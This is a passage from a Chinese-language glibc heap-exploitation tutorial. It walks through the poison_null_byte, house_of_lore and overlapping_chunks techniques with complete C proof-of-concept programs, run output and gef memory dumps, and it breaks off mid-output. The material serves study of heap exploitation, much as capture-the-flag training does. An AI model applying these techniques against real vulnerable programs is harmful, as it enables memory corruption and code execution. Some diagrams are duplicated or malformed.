    fprintf(stderr, "b.size: %#lx ((0x100 + 0x10) | prev_in_use)\n\n", *b_size_ptr);

    // deal with tcache
    // int *k[10], i;
    // for (i = 0; i < 7; i++) {
    //     k[i] = malloc(0x100);
    // }
    // for (i = 0; i < 7; i++) {
    //     free(k[i]);
    // }
    free(b);
    uint64_t* c_prev_size_ptr = ((uint64_t*)c) - 2;
    fprintf(stderr, "After free(b), c.prev_size: %#lx\n", *c_prev_size_ptr);

    a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
    fprintf(stderr, "b.size: %#lx\n\n", *b_size_ptr);

    fprintf(stderr, "Pass the check: chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x80);
    memset(b1, 'A', 0x80);
    fprintf(stderr, "We malloc 'b1': %p\n", b1);
    fprintf(stderr, "c.prev_size: %#lx\n", *c_prev_size_ptr);
    fprintf(stderr, "fake c.prev_size: %#lx\n\n", *(((uint64_t*)c)-4));

    b2 = malloc(0x40);
    memset(b2, 'A', 0x40);
    fprintf(stderr, "We malloc 'b2', our 'victim' chunk: %p\n", b2);

    // deal with tcache
    // for (i = 0; i < 7; i++) {
    //     k[i] = malloc(0x80);
    // }
    // for (i = 0; i < 7; i++) {
    //     free(k[i]);
    // }
    free(b1);
    free(c);
    fprintf(stderr, "Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

    d = malloc(0x110);
    fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2': %p\n\n", d);

    fprintf(stderr, "b2 content:%s\n", b2);
    memset(d, 'B', 0xb0);
    fprintf(stderr, "New b2 content:%s\n", b2);
}
```



```c
$ gcc -g poison_null_byte.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0xabb010
'real' size of 'a': 0x18
b: 0xabb030
c: 0xabb140
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0xabb030
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0xabb0c0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0xabb030

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

> 通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的
>
> 对于单字节溢出的利用有下面几种：
>
> - 扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出
>
>   ```text
>     0x100   0x100    0x80
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   初始状态
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   溢出 B 的 size 为 0x180
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   释放 B
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   malloc(0x180-8)
>   |-------|-------|-------|   C 块被覆盖
>           |<--实际得到的块->|
>   ```
>
> - 扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出
>
>   ```text
>     0x100   0x100    0x80
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   初始状态
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   溢出 B 的 size 为 0x180
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   释放 B
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   malloc(0x180-8)
>   |-------|-------|-------|   C 块被覆盖
>           |<--实际得到的块->|
>   ```
>
> - 收缩被释放块：此情况针对溢出的字节只能为 0 的时候，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块
>
>   ```text
>     0x100     0x210     0x80
>   |-------|---------------|-------|
>   |   A   |       B       |   C   |   初始状态
>   |-------|---------------|-------|
>   |   A   |       B       |   C   |   释放 B
>   |-------|---------------|-------|
>   |   A   |       B       |   C   |   溢出 B 的 size 为 0x200
>   |-------|---------------|-------|   之后的 malloc 操作没有更新 C 的 prev_size
>   初始状态，B大小为0x210，C的prev_size为0x210
>   释放B，B进入unsorted bin，通过溢出将B的size修改为0x200，
>   ```
>
> 
>
>            0x180  0x80
>
>   |-------|------|-----|--|-------|
>   |   A   |  B1  | B2  |  |   C   |   malloc(0x180-8), malloc(0x80-8)
>   |-------|------|-----|--|-------|
>   |   A   |  B1  | B2  |  |   C   |   释放 B1
>   |-------|------|-----|--|-------|
>   |   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并
>   |-------|------|-----|--|-------|  
>   |   A   |  B1  | B2  |  |   C   |   malloc(0x180-8)
>   |-------|------|-----|--|-------|   B2 将被覆盖
>           |<实际得到的块>|
>
>   其后申请0x180给B1，会从B中切0x180
>   剩下的0x80形成新的chunk B2（依旧在bin中）
>   分配器只会更新B2的prev_size为0x180，它不会去修改C的prev_size
>   申请0x80，申请到B2
>   释放B1，此时B1的标志位会修改为0
>   此时释放C，系统通过索引C的prev_size找到B1，并通过标志位发现可以向前合并
>   于是B、C的整个内存合成了一个大的unsorted bin
>   重新申请chunk时，会从这个unsorted bin中切割，可以造成与B2的堆叠
>
>   ```
> - house of einherjar：也是溢出字节只能为 0 的情况，当它是**更新溢出块下一块的 prev_size 字段**，使其在被释放时能够找到之前一个合法的被释放块并与其合并，造成堆块重叠
> 
>   ```text
>     0x100   0x100   0x101
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   初始状态
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   释放 A
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   溢出 B，覆盖 C 块的 size 为 0x200，并使其 prev_size 为 0x200
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   释放 C
>   |-------|-------|-------|
>   |   A   |   B   |   C   |   C 将与 A 合并
>   |-------|-------|-------|   B 块被重叠
>   |<-----实际得到的块------>|
>   ```

首先分配三个 chunk，第一个 chunk 类型无所谓，但后两个不能是 fast chunk，因为 fast chunk 在释放后不会被合并。这里 chunk a 用于制造单字节溢出，去覆盖 chunk b 的第一个字节，chunk c 的作用是帮助伪造 fake chunk。

为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即 `0x100 `，正好是 NULL 字节溢出后的值。然后把 chunk b 释放掉，chunk b 随后被放到 unsorted bin 中，大小是 0x110。此时的堆布局如下：

```c
gef➤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000111  <-- chunk b [be freed]
0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x603040:    0x0000000000000000    0x0000000000000000
0x603050:    0x0000000000000000    0x0000000000000000
0x603060:    0x0000000000000000    0x0000000000000000
0x603070:    0x0000000000000000    0x0000000000000000
0x603080:    0x0000000000000000    0x0000000000000000
0x603090:    0x0000000000000000    0x0000000000000000
0x6030a0:    0x0000000000000000    0x0000000000000000
0x6030b0:    0x0000000000000000    0x0000000000000000
0x6030c0:    0x0000000000000000    0x0000000000000000
0x6030d0:    0x0000000000000000    0x0000000000000000
0x6030e0:    0x0000000000000000    0x0000000000000000
0x6030f0:    0x0000000000000000    0x0000000000000000
0x603100:    0x0000000000000000    0x0000000000000000
0x603110:    0x0000000000000000    0x0000000000000000
0x603120:    0x0000000000000100    0x0000000000000000      <-- fake c.prev_size
0x603130:    0x0000000000000110    0x0000000000000090  <-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
 →   Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE)
```

最关键的一步，通过溢出漏洞覆写 chunk b 的数据：

```c
gef➤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000100  <-- chunk b [be freed]
0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x603040:    0x0000000000000000    0x0000000000000000
0x603050:    0x0000000000000000    0x0000000000000000
0x603060:    0x0000000000000000    0x0000000000000000
0x603070:    0x0000000000000000    0x0000000000000000
0x603080:    0x0000000000000000    0x0000000000000000
0x603090:    0x0000000000000000    0x0000000000000000
0x6030a0:    0x0000000000000000    0x0000000000000000
0x6030b0:    0x0000000000000000    0x0000000000000000
0x6030c0:    0x0000000000000000    0x0000000000000000
0x6030d0:    0x0000000000000000    0x0000000000000000
0x6030e0:    0x0000000000000000    0x0000000000000000
0x6030f0:    0x0000000000000000    0x0000000000000000
0x603100:    0x0000000000000000    0x0000000000000000
0x603110:    0x0000000000000000    0x0000000000000000
0x603120:    0x0000000000000100    0x0000000000000000      <-- fake c.prev_size
0x603130:    0x0000000000000110    0x0000000000000090  <-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
 →   Chunk(addr=0x603030, size=0x100, flags=)
```

此时，通过prev_size检查：$$P \to \text{size} == (P + P \to \text{size}) \to \text{prev\_size}$$

另外 unsorted bin 中的 chunk 大小也变成了 0x100。

接下来随意分配两个 chunk，malloc 会从 unsorted bin 中划出合适大小的内存返回给用户：

```c
gef➤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000091  <-- chunk b1  <-- fake chunk b
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x4141414141414141    0x4141414141414141
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000051  <-- chunk b2  <-- 'victim' chunk
0x6030c0:    0x4141414141414141    0x4141414141414141
0x6030d0:    0x4141414141414141    0x4141414141414141
0x6030e0:    0x4141414141414141    0x4141414141414141
0x6030f0:    0x4141414141414141    0x4141414141414141
0x603100:    0x0000000000000000    0x0000000000000021  <-- unsorted bin		//剩下的0x20为unsorted bin
0x603110:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x603120:    0x0000000000000020    0x0000000000000000      <-- fake c.prev_size		//分配之后，fake c.prev_size	发生变化，为unsorted bin的大小
0x603130:    0x0000000000000110    0x0000000000000090  <-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603100, bk=0x603100
 →   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
```

分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x110 的 free chunk。但其实这片内存已经被分配给了 chunk b1。

接下来我们先free b1，伪造出 fake chunk b 是 free chunk 的样子。然后free C，free C的时候会通过prev_size检查是否前一个chunk能否合并，显然通过索引到的“前一个chunk”为b1，发现b1是free状态，触发合并

chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk

接下来，申请一块大空间，大到可以把 chunk b2 包含进来，这样 chunk b2 就完全被我们控制了。

```c
gef➤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000121  <-- chunk d
0x603030:    0x4242424242424242    0x4242424242424242
0x603040:    0x4242424242424242    0x4242424242424242
0x603050:    0x4242424242424242    0x4242424242424242
0x603060:    0x4242424242424242    0x4242424242424242
0x603070:    0x4242424242424242    0x4242424242424242
0x603080:    0x4242424242424242    0x4242424242424242
0x603090:    0x4242424242424242    0x4242424242424242
0x6030a0:    0x4242424242424242    0x4242424242424242
0x6030b0:    0x4242424242424242    0x4242424242424242  <-- chunk b2  <-- 'victim' chunk
0x6030c0:    0x4242424242424242    0x4242424242424242
0x6030d0:    0x4242424242424242    0x4242424242424242
0x6030e0:    0x4141414141414141    0x4141414141414141
0x6030f0:    0x4141414141414141    0x4141414141414141
0x603100:    0x0000000000000000    0x0000000000000021  <-- small bins
0x603110:    0x00007ffff7dd1b88    0x00007ffff7dd1b88      <-- fd, bk pointer
0x603120:    0x0000000000000020    0x0000000000000000
0x603130:    0x0000000000000110    0x0000000000000090
0x603140:    0x0000000000000000    0x0000000000020ec1  <-- top chunk
gef➤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[1]: fw=0x603100, bk=0x603100
 →   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
```

我们malloc的大小大于0x80，此时申请到的chunk d与b2发生了重叠

还有个事情值得注意，在分配 chunk d 时，由于在 unsorted bin 中没有找到适合的 chunk，malloc 就将 unsorted bin 中的 chunk 都整理回各自的 bins 中了，这里就是 small bins。

最后，继续看 libc-2.26 上的情况，还是一样的，处理好 tchache 就可以了，把两种大小的 tcache bin 都占满。





### house_of_lore

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main() {
    intptr_t *victim = malloc(0x80);
    memset(victim, 'A', 0x80);
    void *p5 = malloc(0x10);
    memset(p5, 'A', 0x10);
    intptr_t *victim_chunk = victim - 2;
    fprintf(stderr, "Allocated the victim (small) chunk: %p\n", victim);

    intptr_t* stack_buffer_1[4] = {0};
    intptr_t* stack_buffer_2[3] = {0};
    stack_buffer_1[0] = 0;
    stack_buffer_1[2] = victim_chunk;
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    fprintf(stderr, "stack_buffer_1: %p\n", (void*)stack_buffer_1);
    fprintf(stderr, "stack_buffer_2: %p\n\n", (void*)stack_buffer_2);

    free((void*)victim);
    fprintf(stderr, "Freeing the victim chunk %p, it will be inserted in the unsorted bin\n", victim);
    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

    void *p2 = malloc(0x100);
    fprintf(stderr, "Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n", p2);
    fprintf(stderr, "The victim chunk %p will be inserted in front of the SmallBin\n", victim);
    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

    victim[1] = (intptr_t)stack_buffer_1;
    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

    void *p3 = malloc(0x40);
    char *p4 = malloc(0x80);
    memset(p4, 'A', 0x10);
    fprintf(stderr, "This last malloc should return a chunk at the position injected in bin->bk: %p\n", p4);
    fprintf(stderr, "The fd pointer of stack_buffer_2 has changed: %p\n\n", stack_buffer_2[2]);

    intptr_t sc = (intptr_t)jackpot;
    memcpy((p4+40), &sc, 8);
}
```



```c
$ gcc -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x1b2e010
stack_buffer_1: 0x7ffe5c570350
stack_buffer_2: 0x7ffe5c570330

Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin
victim->fd: 0x7f239d4c9b78
victim->bk: 0x7f239d4c9b78

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0
The victim chunk 0x1b2e010 will be inserted in front of the SmallBin
victim->fd: 0x7f239d4c9bf8
victim->bk: 0x7f239d4c9bf8

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360
The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8

Nice jump d00d
```

接下来，我们要尝试伪造一条 small bins 链。

首先创建两个 chunk，第一个是我们的 victim chunk，请确保它是一个 small chunk，第二个随意，只是为了确保在 free 时 victim chunk 不会被合并进 top chunk 里。然后，在栈上伪造两个 fake chunk，让 fake chunk 1 的 fd 指向 victim chunk，bk 指向 fake chunk 2；fake chunk 2 的 fd 指向 fake chunk 1，这样一个 small bin 链就差不多了：

```c
gef➤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000000    0x0000000000000021  <-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6030c0:    0x0000000000000000    0x0000000000000000
gef➤  x/10gx &stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30      <-- fd->victim chunk, bk->fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
```



molloc 中对于 small bin 链表的检查是通过对bin中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏，因此，为了绕过检查，我需要同时伪造bin中前两个chunk

```c
          [...]

          else
            {
              bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim))
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              [...]
```

接下来释放掉 victim chunk，它会被放到 unsoted bin 中，且 fd/bk 均指向 unsorted bin 的头部：

```c
gef➤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk [be freed]
0x603010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000090    0x0000000000000020  <-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6030c0:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603000, bk=0x603000
 →   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
```

这时，申请一块大的 chunk，只需要大到让 malloc 在 unsorted bin 中找不到合适的就可以了。这样原本在 unsorted bin 中的 chunk，会被整理回各自的所属的 bins 中，这里就是 small bins：

```c
gef➤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[8]: fw=0x603000, bk=0x603000
 →   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
```

接下来是最关键的一步，假设存在一个漏洞，可以让我们修改 victim chunk 的 bk 指针。那么就修改 bk 让它指向我们在栈上布置的 fake small bin：

```c
gef➤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk [be freed]
0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50      <-- bk->fake chunk 1
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000090    0x0000000000000020  <-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000111  <-- chunk p2
0x6030c0:    0x0000000000000000    0x0000000000000000
gef➤  x/10gx &stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30     <-- fd->victim chunk, bk->fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
```

我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时整条链是这样的：

```c
HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> victim chunk <-> TAIL

fd: ->
bk: <-
```

fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。

接下来的第一个 malloc，会返回 victim chunk 的地址，如果 malloc 的大小正好等于 victim chunk 的大小，那么情况会简单一点。但是这里我们不这样做，malloc 一个小一点的地址，可以看到，malloc 从 small bin 里取出了末尾的 victim chunk，切了一块返回给 chunk p3，然后把剩下的部分放回到了 unsorted bin。同时 small bin 变成了这样：

```c
HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> TAIL
    
    

gef➤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000051  <-- chunk p3
0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x0000000000000041  <-- unsorted bin
0x603060:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000040    0x0000000000000020  <-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000111  <-- chunk p2
0x6030c0:    0x0000000000000000    0x0000000000000000
gef➤  x/10gx &stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
0x7fffffffdc60:    0x00007ffff7dd1bf8    0x00007fffffffdc30      <-- fd->TAIL, bk->fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603050, bk=0x603050
 →   Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE)    
```



最后，再次 malloc 将返回 fake chunk 1 的地址，地址在栈上且我们能够控制。同时 small bin 变成这样：

```c
HEAD(undefined) <-> fake chunk 2 <-> TAIL
    
    
    
    
gef➤  x/10gx &stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
0x7fffffffdc40:    0x00007ffff7dd1bf8    0x0000000000400aed      <-- fd->TAIL
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- chunk 4
0x7fffffffdc60:    0x4141414141414141    0x4141414141414141
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
```

于是我们就成功地骗过了 malloc 在栈上分配了一个 chunk

heap-use-after-free，所以上面我们用于修改 bk 指针的漏洞，应该就是一个 UAF 吧，当然溢出也是可以的



#### libc-2.27 版本

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main() {
    intptr_t *victim = malloc(0x80);

    // fill the tcache
    int *a[10];
    int i;
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }

    memset(victim, 'A', 0x80);
    void *p5 = malloc(0x10);
    memset(p5, 'A', 0x10);
    intptr_t *victim_chunk = victim - 2;
    fprintf(stderr, "Allocated the victim (small) chunk: %p\n", victim);

    intptr_t* stack_buffer_1[4] = {0};
    intptr_t* stack_buffer_2[6] = {0};
    stack_buffer_1[0] = 0;
    stack_buffer_1[2] = victim_chunk;
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    stack_buffer_2[3] = (intptr_t*)stack_buffer_1;    // 3675 bck->fd = bin;

    fprintf(stderr, "stack_buffer_1: %p\n", (void*)stack_buffer_1);
    fprintf(stderr, "stack_buffer_2: %p\n\n", (void*)stack_buffer_2);

    free((void*)victim);
    fprintf(stderr, "Freeing the victim chunk %p, it will be inserted in the unsorted bin\n", victim);
    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

    void *p2 = malloc(0x100);
    fprintf(stderr, "Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n", p2);
    fprintf(stderr, "The victim chunk %p will be inserted in front of the SmallBin\n", victim);
    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

    victim[1] = (intptr_t)stack_buffer_1;
    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

    void *p3 = malloc(0x40);

    // empty the tcache
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }

    char *p4 = malloc(0x80);
    memset(p4, 'A', 0x10);
    fprintf(stderr, "This last malloc should return a chunk at the position injected in bin->bk: %p\n", p4);
    fprintf(stderr, "The fd pointer of stack_buffer_2 has changed: %p\n\n", stack_buffer_2[2]);

    intptr_t sc = (intptr_t)jackpot;
    memcpy((p4+0xa8), &sc, 8);
}
```

```c
$ gcc -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x55674d75f260
stack_buffer_1: 0x7ffff71fb1d0
stack_buffer_2: 0x7ffff71fb1f0

Freeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin
victim->fd: 0x7f1eba392b00
victim->bk: 0x7f1eba392b00

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700
The victim chunk 0x55674d75f260 will be inserted in front of the SmallBin
victim->fd: 0x7f1eba392b80
victim->bk: 0x7f1eba392b80

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffff71fb1e0
The fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0

Nice jump d00d
```





### overlapping_chunks

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main() {
    intptr_t *p1,*p2,*p3,*p4;

    p1 = malloc(0x90 - 8);
    p2 = malloc(0x90 - 8);
    p3 = malloc(0x80 - 8);
    memset(p1, 'A', 0x90 - 8);
    memset(p2, 'A', 0x90 - 8);
    memset(p3, 'A', 0x80 - 8);
    fprintf(stderr, "Now we allocate 3 chunks on the heap\n");
    fprintf(stderr, "p1=%p\np2=%p\np3=%p\n\n", p1, p2, p3);

    free(p2);
    fprintf(stderr, "Freeing the chunk p2\n");

    int evil_chunk_size = 0x111;
    int evil_region_size = 0x110 - 8;
    *(p2-1) = evil_chunk_size; // Overwriting the "size" field of chunk p2
    fprintf(stderr, "Emulating an overflow that can overwrite the size of the chunk p2.\n\n");

    p4 = malloc(evil_region_size);
    fprintf(stderr, "p4: %p ~ %p\n", p4, p4+evil_region_size);
    fprintf(stderr, "p3: %p ~ %p\n", p3, p3+0x80);

    fprintf(stderr, "\nIf we memset(p4, 'B', 0xd0), we have:\n");
    memset(p4, 'B', 0xd0);
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);

    fprintf(stderr, "\nIf we memset(p3, 'C', 0x50), we have:\n");
    memset(p3, 'C', 0x50);
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

```c
$ gcc -g overlapping_chunks.c
$ ./a.out
Now we allocate 3 chunks on the heap
p1=0x1e2b010
p2=0x1e2b0a0
p3=0x1e2b130

Freeing the chunk p2
Emulating an overflow that can overwrite the size of the chunk p2.

